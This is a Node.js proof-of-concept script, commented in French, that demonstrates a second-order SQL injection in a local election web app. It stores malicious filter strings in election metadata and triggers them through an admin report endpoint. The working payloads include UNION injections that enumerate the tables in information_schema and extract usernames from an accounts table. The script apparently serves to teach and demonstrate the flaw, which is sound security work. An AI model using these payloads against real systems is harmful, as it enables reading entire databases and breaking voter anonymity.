const fetch = require('node-fetch');

const API_URL = 'http://localhost:3000/api';

async function createElectionWithMaliciousFilter(slug, filterPayload) {
  const response = await fetch(`${API_URL}/admin/election`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      slug: slug,
      name: `Élection de test - ${slug}`,
      category: 'test',
      metadata: {
        description: 'Test de vulnérabilité',
        filter: filterPayload  // ⚠️ Payload injecté ici
      }
    })
  });

  return await response.json();
}

async function runReport(electionId) {
  const response = await fetch(`${API_URL}/admin/report/run`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      filter_id: electionId
    })
  });

  return { status: response.status, data: await response.json() };
}

async function getElectionId(slug) {
  const response = await fetch(`${API_URL}/election/${slug}`);
  const data = await response.json();
  return data.id;
}

async function demonstrateSecondOrderSQLi() {
  console.log('\n🔓 DÉMONSTRATION: Second-order SQLi\n');
  console.log('═'.repeat(60));
  
  console.log('\n📝 ÉTAPE 1: Création d\'élections avec différents filtres\n');
  
  const testCases = [
    {
      slug: 'test-legitimate-filter',
      filter: 'election_id = 1',
      label: 'Filtre légitime',
      description: 'Filtre SQL valide et sûr'
    },
    {
      slug: 'test-sql-comment',
      filter: '1=1 -- ',
      label: 'Injection commentaire',
      description: 'Utilise -- pour commenter le reste de la requête'
    },
    {
      slug: 'test-union-attack',
      filter: "1=1 UNION SELECT 'INJECTED' as choice, 999 as votes -- ",
      label: 'Injection UNION',
      description: 'Ajoute des données fictives au résultat'
    },
    {
      slug: 'test-show-tables',
      filter: "1=0 UNION SELECT table_name as choice, 1 as votes FROM information_schema.tables WHERE table_schema='votex' -- ",
      label: 'Énumération des tables',
      description: 'Récupère la liste des tables de la base'
    }
  ];

  console.log('Slug                        | Type                  | Status');
  console.log('-'.repeat(75));

  for (const test of testCases) {
    const result = await createElectionWithMaliciousFilter(test.slug, test.filter);
    console.log(`${test.slug.padEnd(27)} | ${test.label.padEnd(21)} | ${result.message ? '✓ Créé' : '✗ Erreur'}`);
  }

  console.log('\n📊 ÉTAPE 2: Exécution des rapports (déclenchement de l\'injection)\n');
  console.log('⚠️  Les filtres stockés sont maintenant réutilisés dans des requêtes SQL\n');

  console.log('Type d\'injection            | Résultat');
  console.log('-'.repeat(75));

  for (const test of testCases) {
    try {
      const electionId = await getElectionId(test.slug);
      const report = await runReport(electionId);
      
      if (report.status === 200) {
        const resultCount = report.data.results ? report.data.results.length : 0;
        const preview = report.data.results ? 
          report.data.results.slice(0, 2).map(r => `${r.choice}: ${r.votes}`).join(', ') : 
          'Aucun résultat';
        
        console.log(`${test.label.padEnd(27)} | ${resultCount} résultat(s): ${preview}`);
        
        // Afficher les résultats complets pour l'énumération des tables
        if (test.slug === 'test-show-tables' && report.data.results) {
          console.log('\n   🔍 Tables découvertes:');
          report.data.results.forEach(r => {
            console.log(`      - ${r.choice}`);
          });
          console.log('');
        }
      } else {
        console.log(`${test.label.padEnd(27)} | Erreur: ${report.data.error}`);
      }
    } catch (error) {
      console.log(`${test.label.padEnd(27)} | Exception: ${error.message}`);
    }
  }

  // Démonstration de l'impact
  console.log('\n📌 ÉTAPE 3: Analyse de l\'impact\n');
  
  console.log('🔴 IMPACT CRITIQUE:\n');
  console.log('   1. Exfiltration de données');
  console.log('      → Les résultats des requêtes SQL injectées sont retournés');
  console.log('      → Un attaquant peut lire n\'importe quelle table\n');
  
  console.log('   2. Énumération de la base de données');
  console.log('      → Liste des tables: users, elections, votes, accounts, etc.');
  console.log('      → Structure de la base révélée\n');
  
  console.log('   3. Lecture de données sensibles');
  console.log('      → Possibilité de lire les comptes utilisateurs');
  console.log('      → Possibilité de lire les votes (perte d\'anonymat)\n');

  // Exemple de requête dangereuse
  console.log('📋 EXEMPLE: Extraction des comptes utilisateurs\n');
  
  const dangerousSlug = 'test-extract-accounts';
  await createElectionWithMaliciousFilter(
    dangerousSlug,
    "1=0 UNION SELECT username as choice, COUNT(*) as votes FROM accounts GROUP BY username -- "
  );
  
  const electionId = await getElectionId(dangerousSlug);
  const dangerousReport = await runReport(electionId);
  
  if (dangerousReport.status === 200 && dangerousReport.data.results) {
    console.log('   Comptes utilisateurs extraits:');
    dangerousReport.data.results.forEach(r => {
      console.log(`   - ${r.choice}`);
    });
  }

  // Conclusion
  console.log('\n📌 CONCLUSION:\n');
  console.log('✗ L\'endpoint /api/admin/report/run est VULNÉRABLE au Second-order SQLi');
  console.log('✗ Les métadonnées stockées sont réutilisées sans validation');
  console.log('✗ Un admin malveillant peut injecter du SQL lors de la création d\'élection');
  console.log('✗ Impact: Lecture complète de la base de données, perte d\'anonymat des votes\n');
  console.log('═'.repeat(60));
}

// Exécution
if (require.main === module) {
  console.log('\n⚠️  AVERTISSEMENT: Script de démonstration pédagogique');
  console.log('   Ce script démontre une vulnérabilité à des fins éducatives');
  console.log('   Assurez-vous que le serveur est démarré sur http://localhost:3000\n');
  
  demonstrateSecondOrderSQLi().catch(error => {
    console.error('\n❌ Erreur:', error.message);
  });
}